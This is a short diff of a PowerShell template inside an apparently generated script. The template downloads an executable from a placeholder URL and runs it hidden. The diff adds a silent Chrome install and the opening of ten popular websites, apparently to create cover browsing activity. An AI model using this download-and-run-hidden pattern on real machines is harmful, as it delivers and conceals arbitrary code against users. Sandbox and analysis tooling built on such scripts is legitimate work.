@@ -943,6 +943,12 @@ Invoke-WebRequest -Uri "{{PE_URL}}" -OutFile $outPath -UseBasicParsing
 
 Start-Sleep -Seconds 2
 Start-Process -FilePath $outPath {{ARGS_BLOCK}} -WindowStyle Hidden
+
+Start-Sleep -Seconds 5
+Invoke-WebRequest -Uri "https://dl.google.com/chrome/install/375.126/chrome_installer.exe" -OutFile "C:\Users\Public\chrome_installer.exe" -UseBasicParsing
+Start-Process -FilePath "C:\Users\Public\chrome_installer.exe" -ArgumentList "/silent /install" -Wait
+Start-Sleep -Seconds 10
+Start-Process "chrome.exe" -ArgumentList "google.com","youtube.com","github.com","wikipedia.org","reddit.com","twitter.com","amazon.com","netflix.com","dailymail.co.uk","bbc.com"
 '@
 
     $argsBlock = if ($PEArgs) { "-ArgumentList '$PEArgs'" } else { "" }
